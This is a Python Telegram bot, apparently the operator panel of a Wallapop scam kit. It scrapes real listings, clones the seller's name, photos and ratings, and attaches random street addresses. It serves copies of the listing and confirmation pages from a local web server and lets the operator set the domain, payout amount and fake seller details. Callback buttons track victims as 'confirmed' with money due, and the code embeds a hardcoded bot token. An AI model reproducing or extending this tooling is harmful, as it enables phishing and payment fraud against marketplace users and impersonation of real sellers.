#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import json
import html
import random
import string
import logging
import threading
import http.server
import socketserver
from typing import Dict, Any

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Configuración básica
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("WallapopBot")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOKEN_FILE = os.path.join(BASE_DIR, "token.txt")
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
DB_JSON_FILE = os.path.join(BASE_DIR, "products.json")
DB_JS_FILE = os.path.join(BASE_DIR, "products.js")

DEFAULT_TOKEN = "8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM"

def load_token() -> str:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                if cfg.get("token"):
                    return cfg["token"].strip()
        except Exception:
            pass
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, "r", encoding="utf-8") as f:
                t = f.read().strip()
                if t:
                    return t
        except Exception:
            pass
    return os.getenv("BOT_TOKEN", DEFAULT_TOKEN).strip()

def load_config() -> Dict[str, Any]:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                return cfg
        except Exception:
            pass
    return {
        "token": DEFAULT_TOKEN,
        "port": 3000,
        "publicUrl": "http://localhost:3000",
        "base_url": "http://localhost:3000/a/"
    }

def save_config(cfg: Dict[str, Any]):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)

def load_db() -> Dict[str, Any]:
    if os.path.exists(DB_JSON_FILE):
        try:
            with open(DB_JSON_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    # Producto inicial de ejemplo
    init_id = "AD8351003"
    init_prod = {
        "id": init_id,
        "titulo": "Lote Perfumes Mujer 14 Uds.",
        "precio": 250,
        "precioArticulo": 250,
        "descripcion": "Lote de 14 perfumes de mujer, todos precintados. Se vende el lote completo, no se hacen separaciones.",
        "nombre": "Sofía Chamizo",
        "direccion": "Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024",
        "articulo": "Lote Perfumes Mujer 14 uds.",
        "fotos": []
    }
    db = {"products": {init_id: init_prod}, "activeId": init_id}
    save_db(db)
    return db

def save_db(db: Dict[str, Any]):
    try:
        with open(DB_JSON_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
        with open(DB_JS_FILE, "w", encoding="utf-8") as f:
            f.write("window.SERVER_DB = " + json.dumps(db, ensure_ascii=False, indent=2) + ";\n")
        web_products = os.path.join(BASE_DIR, "web", "products.json")
        if os.path.exists(os.path.join(BASE_DIR, "web")):
            with open(web_products, "w", encoding="utf-8") as f:
                json.dump(db, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Error guardando base de datos: {e}")

config = load_config()
db = load_db()
wizards: Dict[int, Dict[str, Any]] = {}

def gen_id() -> str:
    # Formato estilo AD + 7 dígitos como en el ejemplo #AD8351003
    nums = "".join(random.choices(string.digits, k=7))
    return f"AD{nums}"

def fmt_eur(val) -> str:
    try:
        n = float(val)
        if n.is_integer():
            return f"{int(n)} €"
        return f"{n:,.2f} €".replace(",", "X").replace(".", ",").replace("X", ".")
    except Exception:
        return f"{val} €"

def get_link(prod_id: str) -> str:
    base = config.get("publicUrl") or config.get("base_url") or "http://localhost:3000"
    base = base.rstrip("/")
    if base.endswith("/a"):
        clean_base = f"{base}/{prod_id}"
    else:
        clean_base = f"{base}/a/{prod_id}"
    p = db.get("products", {}).get(prod_id)
    if p:
        try:
            import base64, urllib.parse
            b64 = base64.b64encode(json.dumps(p, ensure_ascii=False).encode("utf-8")).decode("utf-8")
            return f"{clean_base}?p={urllib.parse.quote(b64)}"
        except Exception:
            pass
    return clean_base

# ==================== SERVIDOR WEB LOCAL INTEGRADO ====================
WEB_DIR = os.path.join(BASE_DIR, "web") if os.path.exists(os.path.join(BASE_DIR, "web")) else BASE_DIR

class WallapopHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=WEB_DIR, **kwargs)

    def do_GET(self):
        # Si la ruta es /a/ID, servir index.html
        clean_path = self.path.split("?")[0].split("#")[0]
        if clean_path.startswith("/a/"):
            self.path = "/index.html"
        elif clean_path == "/confirmar":
            self.path = "/confirmar.html"
        elif clean_path == "/step2":
            self.path = "/step2.html"
        return super().do_GET()

    def log_message(self, format, *args):
        # Silenciar logs continuos en consola
        pass

def run_web_server(port: int):
    try:
        with socketserver.TCPServer(("", port), WallapopHTTPHandler) as httpd:
            logger.info(f"🌐 Servidor web activo en http://localhost:{port}/")
            httpd.serve_forever()
    except Exception as e:
        logger.warning(f"No se pudo iniciar el servidor web en el puerto {port} ({e}). Continuando solo con el bot.")

# ==================== MANEJADORES DE TELEGRAM ====================
AYUDA_TXT = (
    "<b>Panel de control Wallapop 2.0</b>\n\n"
    "<b>Comandos principales:</b>\n"
    "• <code>/nuevo</code> — Crear un producto paso a paso\n"
    "• <code>/productos</code> — Listar productos y enlaces\n"
    "• <code>/editar ID</code> — Seleccionar producto activo\n"
    "• <code>/dominio URL</code> — Cambiar dominio base\n"
    "• <code>/estado</code> — Ver resumen del producto activo\n\n"
    "<b>Modificar producto activo:</b>\n"
    "• <code>/titulo texto</code>\n"
    "• <code>/precio número</code>\n"
    "• <code>/descripcion texto</code>\n"
    "• <code>/importe número</code>\n"
    "• <code>/nombre texto</code>\n"
    "• <code>/direccion texto</code>\n"
    "• <code>/articulo texto</code>\n"
    "• <code>/foto</code> (y envía imágenes)\n"
    "• <code>/quitarfotos</code>\n\n"
    "• <code>/borrar ID</code> · <code>/cancelar</code> · <code>/ayuda</code>"
)

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(AYUDA_TXT, parse_mode="HTML")

async def cmd_dominio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        curr = config.get("base_url", "http://localhost:8000/a/")
        await update.message.reply_text(
            f"Dominio actual: <code>{curr}</code>\n\n"
            "Uso: <code>/dominio https://tu-sitio.com/</code>",
            parse_mode="HTML"
        )
        return
    url = args[0].strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    if not url.endswith("/"):
        url += "/"
    config["base_url"] = url
    save_config(config)
    await update.message.reply_text(
        f"✅ Dominio actualizado a:\n<code>{url}</code>",
        parse_mode="HTML"
    )

DIRECCIONES_REALES = [
    "Calle de Velázquez 42, 3º Dcha, 28001 Madrid",
    "Carrer de Mallorca 234, 2º 1ª, 08008 Barcelona",
    "Calle Sierpes 18, 1º B, 41004 Sevilla",
    "Calle Colón 33, 4º C, 46004 Valencia",
    "Paseo Prudencia Narváez 48, Piso 4, 17024 Cáceres",
    "Calle Larios 12, 2º A, 29005 Málaga",
    "Calle Alfonso I 29, 3º Izq, 50003 Zaragoza",
    "Gran Vía 67, 5º Ext, 28013 Madrid",
    "Rambla de Catalunya 85, Principal 2ª, 08008 Barcelona",
    "Calle Marqués de Larios 5, 3º B, 29015 Málaga",
    "Calle San Fernando 14, 2º A, 41004 Sevilla",
    "Avenida de la Constitución 22, 1º Izq, 18012 Granada",
    "Calle Uría 38, 4º D, 33003 Oviedo",
    "Calle Príncipe 15, 2º C, 36202 Vigo, Pontevedra",
    "Calle Poeta Querol 8, 3º B, 46002 Valencia",
    "Paseo de Zorrilla 45, 6º A, 47007 Valladolid",
    "Calle Recogidas 31, 3º Dcha, 18002 Granada",
    "Avenida de la Libertad 19, 2º B, 20004 San Sebastián, Guipúzcoa",
    "Calle Mayor 14, 2º Izq, 28013 Madrid",
    "Calle San Vicente Mártir 54, 5º B, 46002 Valencia"
]

def scrape_wallapop(url: str) -> dict:
    import urllib.request
    import re
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "es-ES,es;q=0.9"
        }
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        html_text = resp.read().decode("utf-8", errors="ignore")

    prod = {
        "titulo": "",
        "subtitulo": "",
        "precio": 0,
        "precioArticulo": 0,
        "descripcion": "",
        "nombre": "Sofía Chamizo",
        "avatar": "",
        "rating_score": "4.9",
        "rating_reviews": "81",
        "verificado": True,
        "direccion": random.choice(DIRECCIONES_REALES),
        "fotos": []
    }

    m = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>', html_text, re.DOTALL)
    if m:
        try:
            data = json.loads(m.group(1))
            item = data.get("props", {}).get("pageProps", {}).get("item", {})
            seller = data.get("props", {}).get("pageProps", {}).get("itemSeller", {})

            if item:
                if isinstance(item.get("title"), dict):
                    prod["titulo"] = item["title"].get("original") or ""
                elif isinstance(item.get("title"), str):
                    prod["titulo"] = item["title"]

                price_info = item.get("price", {})
                if isinstance(price_info, dict):
                    cash = price_info.get("cash", {})
                    amount = cash.get("amount") if isinstance(cash, dict) else price_info.get("amount")
                    if amount:
                        prod["precio"] = float(amount)

                desc_info = item.get("description", {})
                if isinstance(desc_info, dict):
                    prod["descripcion"] = desc_info.get("original") or ""
                elif isinstance(desc_info, str):
                    prod["descripcion"] = desc_info

                images = item.get("images", [])
                f_list = []
                for im in images:
                    u = ""
                    if isinstance(im, dict):
                        urls = im.get("urls", {})
                        u = urls.get("big") or im.get("original") or ""
                    elif isinstance(im, str):
                        u = im
                    if u:
                        if "pictureSize=" in u:
                            u = re.sub(r"pictureSize=[^&\"]+", "pictureSize=W800", u)
                        f_list.append(u)
                if f_list:
                    prod["fotos"] = f_list

                sub_parts = []
                cond = item.get("condition")
                if isinstance(cond, dict) and cond.get("text"):
                    sub_parts.append(cond["text"])
                if item.get("brand"):
                    sub_parts.append(item["brand"])
                if item.get("model"):
                    sub_parts.append(item["model"])
                for c in item.get("characteristicsDetails", []):
                    v = c.get("value")
                    if v and v not in sub_parts:
                        sub_parts.append(v)
                if sub_parts:
                    prod["subtitulo"] = " · ".join(sub_parts)

            if seller:
                if seller.get("microName"):
                    prod["nombre"] = seller["microName"]
                if seller.get("avatarImage"):
                    prod["avatar"] = seller["avatarImage"]
                if seller.get("verified") is not None:
                    prod["verificado"] = bool(seller["verified"])
                stats = seller.get("stats", {})
                if stats.get("ratingAverage"):
                    prod["rating_score"] = str(stats["ratingAverage"])
                counters = stats.get("counters", {})
                if counters.get("reviews"):
                    prod["rating_reviews"] = str(counters["reviews"])
        except Exception as e:
            logger.warning(f"Error procesando NEXT_DATA: {e}")

    if not prod["titulo"]:
        m_t = re.search(r'<h1[^>]*class="[^"]*chds-mid-l[^"]*"[^>]*>(.*?)</h1>', html_text, re.DOTALL)
        if not m_t:
            m_t = re.search(r'<h1[^>]*>(.*?)</h1>', html_text, re.DOTALL)
        if m_t:
            prod["titulo"] = re.sub(r'<[^>]+>', '', m_t.group(1)).strip()

    if not prod["precio"]:
        m_p = re.search(r'"price":\s*"?([0-9\.,]+)"?', html_text)
        if m_p:
            prod["precio"] = float(m_p.group(1).replace(",", "."))

    if not prod["descripcion"]:
        m_d = re.search(r'<div[^>]*class="[^"]*_2YE-bW_ProductDescription[^"]*"[^>]*>(.*?)</div>', html_text, re.DOTALL)
        if m_d:
            prod["descripcion"] = re.sub(r'<[^>]+>', '', m_d.group(1)).strip()

    if not prod["fotos"]:
        f_list = []
        for im in re.finditer(r'slot="carousel-content"[^>]*src="([^"]+)"', html_text):
            u = im.group(1)
            u = re.sub(r"pictureSize=[^&\"]+", "pictureSize=W800", u)
            f_list.append(u)
        prod["fotos"] = f_list

    if "Perfil verificado" in html_text:
        prod["verificado"] = True

    prod["precioArticulo"] = prod["precio"]
    prod["articulo"] = prod["titulo"]
    return prod

async def cmd_nuevo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if context.args:
        text_arg = " ".join(context.args)
        m = re.search(r'https?://[^\s]+', text_arg)
        if m:
            await procesar_wallapop_url(update, context, m.group(0))
            return

    wizards[chat_id] = {
        "step": "wallapop_url",
        "draft": {}
    }
    await update.message.reply_text("📎 <b>Crear producto desde Wallapop</b>\n\nEnvía el enlace del anuncio de Wallapop que quieras clonar:", parse_mode="HTML")

async def procesar_wallapop_url(update: Update, context: ContextTypes.DEFAULT_TYPE, url: str):
    chat_id = update.effective_chat.id
    msg = await update.message.reply_text("⏳ <b>Extrayendo datos de Wallapop...</b>", parse_mode="HTML")
    try:
        prod = scrape_wallapop(url)
        if not prod.get("titulo"):
            await msg.edit_text("⚠️ No pude leer los datos del anuncio. Comprueba que el enlace sea correcto y público.")
            return
        new_id = gen_id()
        prod["id"] = new_id
        db["products"][new_id] = prod
        db["activeId"] = new_id
        save_db(db)
        if chat_id in wizards:
            del wizards[chat_id]
        await send_wallapop_card(chat_id, prod, context)
    except Exception as e:
        await msg.edit_text(f"⚠️ Error al procesar el enlace: {e}")

async def cmd_cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in wizards:
        del wizards[chat_id]
        await update.message.reply_text("❌ Creación cancelada.")
    else:
        await update.message.reply_text("No hay ninguna creación en curso.")

async def send_wallapop_card(chat_id: int, prod: Dict[str, Any], context: ContextTypes.DEFAULT_TYPE):
    prod_id = prod["id"]
    link = get_link(prod_id)
    nombre = prod.get("nombre", "Sofía Chamizo")
    titulo = prod.get("titulo", "Artículo Wallapop")

    caption = (
        f"<blockquote><b>{html.escape(nombre)} ➔ {html.escape(titulo)}</b>\n"
        f"{link}</blockquote>\n\n"
        f"<blockquote>🍥 Producto creado con éxito ❞</blockquote>\n\n"
        f"🇪🇸 <u>Wallapop</u> 2.0 • #{prod_id} 📇"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🍥 Abrir anuncio ❞", url=link)]
    ])

    fotos = prod.get("fotos", [])
    if fotos:
        try:
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=fotos[0],
                caption=caption,
                parse_mode="HTML",
                reply_markup=keyboard
            )
            return
        except Exception as e:
            logger.warning(f"No se pudo enviar foto ({e}), enviando texto...")

    await context.bot.send_message(
        chat_id=chat_id,
        text=caption,
        parse_mode="HTML",
        reply_markup=keyboard,
        disable_web_page_preview=False
    )

async def cmd_listo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    wiz = wizards.get(chat_id)
    if not wiz:
        await update.message.reply_text("No hay ningún producto en creación. Usa /nuevo.")
        return

    d = wiz["draft"]
    d["articulo"] = d.get("articulo") or d.get("titulo") or "Artículo"
    d["precioArticulo"] = d.get("precioArticulo") or d.get("precio") or 0
    d["descripcion"] = d.get("descripcion", "")

    db["products"][d["id"]] = d
    db["activeId"] = d["id"]
    save_db(db)
    del wizards[chat_id]

    await send_wallapop_card(chat_id, d, context)

async def cmd_productos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prods = db.get("products", {})
    if not prods:
        await update.message.reply_text("Todavía no hay productos. Usa /nuevo.")
        return

    items = []
    for pid, p in prods.items():
        t = p.get("titulo", "Sin título")
        pr = fmt_eur(p.get("precio", 0))
        lnk = get_link(pid)
        items.append(f"• <b>{html.escape(t)}</b> — {pr}\n<code>{pid}</code> → {lnk}")

    await update.message.reply_text("\n\n".join(items), parse_mode="HTML", disable_web_page_preview=True)

async def cmd_editar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Uso: <code>/editar ID</code>", parse_mode="HTML")
        return
    pid = args[0].strip().replace("#", "")
    if pid not in db.get("products", {}):
        await update.message.reply_text(f"No se encontró el producto <code>{pid}</code>.", parse_mode="HTML")
        return
    db["activeId"] = pid
    save_db(db)
    p = db["products"][pid]
    await update.message.reply_text(
        f"✏️ Producto activo: <b>{html.escape(p.get('titulo', ''))}</b>\n"
        f"Precio: {fmt_eur(p.get('precio', 0))}\n"
        f"ID: <code>{pid}</code>",
        parse_mode="HTML"
    )

async def cmd_borrar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Uso: <code>/borrar ID</code>", parse_mode="HTML")
        return
    pid = args[0].strip().replace("#", "")
    if pid in db.get("products", {}):
        del db["products"][pid]
        if db.get("activeId") == pid:
            db["activeId"] = next(iter(db["products"].keys()), "")
        save_db(db)
        await update.message.reply_text(f"🗑 Producto <code>{pid}</code> borrado.", parse_mode="HTML")
    else:
        await update.message.reply_text("Producto no encontrado.")

async def cmd_estado(update: Update, context: ContextTypes.DEFAULT_TYPE):
    act = db.get("products", {}).get(db.get("activeId"))
    if not act:
        await update.message.reply_text("No hay ningún producto activo. Usa /nuevo o /editar ID.")
        return
    await send_wallapop_card(update.effective_chat.id, act, context)

# ==================== MODIFICADORES DEL PRODUCTO ACTIVO ====================
async def handle_field_update(update: Update, field: str, value: Any, text_ok: str):
    act = db.get("products", {}).get(db.get("activeId"))
    if not act:
        await update.message.reply_text("No hay producto activo. Usa /editar ID.")
        return
    act[field] = value
    save_db(db)
    await update.message.reply_text(text_ok, parse_mode="HTML")

async def cmd_titulo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/titulo Nuevo título</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "titulo", val, f"✅ Título actualizado a: <b>{html.escape(val)}</b>")

async def cmd_precio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip().replace("€", "").replace(",", ".")
    try:
        n = float(val)
        act = db.get("products", {}).get(db.get("activeId"))
        if act:
            act["precio"] = n
            act["precioArticulo"] = n
            save_db(db)
            await update.message.reply_text(f"✅ Precio: <b>{fmt_eur(n)}</b>", parse_mode="HTML")
        else:
            await update.message.reply_text("No hay producto activo.")
    except Exception:
        await update.message.reply_text("Uso: <code>/precio 250</code>", parse_mode="HTML")

async def cmd_importe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip().replace("€", "").replace(",", ".")
    try:
        n = float(val)
        await handle_field_update(update, "precioArticulo", n, f"✅ Importe a recibir: <b>{fmt_eur(n)}</b>")
    except Exception:
        await update.message.reply_text("Uso: <code>/importe 250.00</code>", parse_mode="HTML")

async def cmd_descripcion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/descripcion Texto</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "descripcion", val, "✅ Descripción actualizada.")

async def cmd_nombre(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/nombre Nombre Apellidos</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "nombre", val, f"✅ Nombre actualizado a: <b>{html.escape(val)}</b>")

async def cmd_direccion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/direccion Calle, Ciudad, CP</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "direccion", val, "✅ Dirección actualizada.")

async def cmd_articulo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/articulo Nombre artículo</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "articulo", val, "✅ Artículo actualizado.")

async def cmd_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📷 Envía la foto directamente y la añadiré al producto.")

async def cmd_quitarfotos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    act = db.get("products", {}).get(db.get("activeId"))
    if not act:
        await update.message.reply_text("No hay producto activo.")
        return
    act["fotos"] = []
    save_db(db)
    await update.message.reply_text("🧹 Fotos eliminadas del producto activo.")

# ==================== MENSAJES DE TEXTO Y FOTOS ====================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)
    photo_url = f"https://api.telegram.org/file/bot{context.bot.token}/{file.file_path}"

    wiz = wizards.get(chat_id)
    if wiz and wiz.get("step") == "fotos":
        wiz["draft"]["fotos"].append(photo_url)
        c = len(wiz["draft"]["fotos"])
        await update.message.reply_text(f"🖼 {c} foto(s) guardada(s). Envía más o escribe /listo para terminar.")
        return

    act = db.get("products", {}).get(db.get("activeId"))
    if act:
        act.setdefault("fotos", []).append(photo_url)
        save_db(db)
        c = len(act["fotos"])
        await update.message.reply_text(f"✅ Foto añadida al producto activo ({c} fotos).")
    else:
        await update.message.reply_text("Envía /nuevo o /editar ID antes de mandar fotos.")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    texto = (update.message.text or "").strip()
    if not texto or texto.startswith("/"):
        return

    wiz = wizards.get(chat_id)
    if not wiz:
        return

    step = wiz.get("step")
    d = wiz.get("draft", {})

    if step == "wallapop_url":
        m = re.search(r'https?://[^\s]+', texto)
        if m:
            await procesar_wallapop_url(update, context, m.group(0))
            return
        await update.message.reply_text("⚠️ Envía un enlace válido de Wallapop (ejemplo: https://es.wallapop.com/item/...):")
        return

    if step == "titulo":
        d["titulo"] = texto
        d["articulo"] = texto
        wiz["step"] = "precio"
        await update.message.reply_text("2/5 · ¿Precio en euros? (ejemplo: 250)")
        return

    if step == "precio":
        val = texto.replace("€", "").replace(",", ".").strip()
        try:
            n = float(val)
            d["precio"] = n
            d["precioArticulo"] = n
            wiz["step"] = "nombre"
            await update.message.reply_text("3/5 · ¿Nombre y apellidos completos? (ejemplo: Sofía Chamizo)")
        except Exception:
            await update.message.reply_text("Por favor, introduce un número válido (ejemplo: 250):")
        return

    if step == "nombre":
        d["nombre"] = texto
        wiz["step"] = "direccion"
        await update.message.reply_text("4/5 · ¿Dirección completa de envío? (ejemplo: Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024)")
        return

    if step == "direccion":
        d["direccion"] = texto
        wiz["step"] = "descripcion"
        await update.message.reply_text("5/5 · ¿Descripción del producto? (o pon un . para omitir)")
        return

    if step == "descripcion":
        d["descripcion"] = "" if texto == "." else texto
        wiz["step"] = "fotos"
        await update.message.reply_text("📷 Envía las fotos que quieras y escribe /listo para terminar.")
        return

    if step == "fotos":
        if texto.lower() in ("listo", "/listo"):
            await cmd_listo(update, context)
            return
        await update.message.reply_text("📷 Envía las fotos del producto o escribe /listo para terminar.")
        return

async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cq = update.callback_query
    if not cq:
        return
    data = cq.data or ""
    await cq.answer()
    if data.startswith("confirmar_again_"):
        await cq.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ CONFIRMADO (Dinero en 24h-48h)", callback_data="noop")]])
        )
    elif data.startswith("continuar_"):
        await cq.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ CONTINUADO (Confirmar)", callback_data="noop")]])
        )
    elif data.startswith("error_"):
        await cq.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ ERROR MARCADO", callback_data="noop")]])
        )

def main():
    token = load_token()
    logger.info("Iniciando Bot de Telegram Wallapop 2.0...")

    # Iniciar servidor web en segundo plano
    port = int(config.get("port", 8000))
    t = threading.Thread(target=run_web_server, args=(port,), daemon=True)
    t.start()

    app = ApplicationBuilder().token(token).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("ayuda", cmd_start))
    app.add_handler(CommandHandler("nuevo", cmd_nuevo))
    app.add_handler(CommandHandler("listo", cmd_listo))
    app.add_handler(CommandHandler("cancelar", cmd_cancelar))
    app.add_handler(CommandHandler("productos", cmd_productos))
    app.add_handler(CommandHandler("editar", cmd_editar))
    app.add_handler(CommandHandler("borrar", cmd_borrar))
    app.add_handler(CommandHandler("estado", cmd_estado))
    app.add_handler(CommandHandler("dominio", cmd_dominio))

    app.add_handler(CommandHandler("titulo", cmd_titulo))
    app.add_handler(CommandHandler("precio", cmd_precio))
    app.add_handler(CommandHandler("importe", cmd_importe))
    app.add_handler(CommandHandler("descripcion", cmd_descripcion))
    app.add_handler(CommandHandler("nombre", cmd_nombre))
    app.add_handler(CommandHandler("direccion", cmd_direccion))
    app.add_handler(CommandHandler("articulo", cmd_articulo))
    app.add_handler(CommandHandler("foto", cmd_foto))
    app.add_handler(CommandHandler("quitarfotos", cmd_quitarfotos))

    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callback_query))

    logger.info("Bot listo y escuchando mensajes en Telegram. Presiona Ctrl+C para detener.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
